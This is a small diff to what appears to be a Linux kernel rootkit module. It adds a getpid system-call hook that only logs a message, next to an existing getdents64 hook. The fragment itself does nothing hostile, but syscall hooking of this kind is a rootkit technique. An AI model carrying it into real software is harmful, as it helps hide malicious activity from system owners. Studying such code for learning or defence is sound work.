@@ -184,5 +184,12 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
     return orig_getdents64(p_regs);
 }
 
+SYSCALL_HOOK_HANDLER0(getpid, orig_getpid, p_regs)
+{
+    pr_info("[ROOTKIT] getpid()");
+
+    return orig_getpid(p_regs);
+}
+
 module_init(rootkit_init);
 module_exit(rootkit_exit);
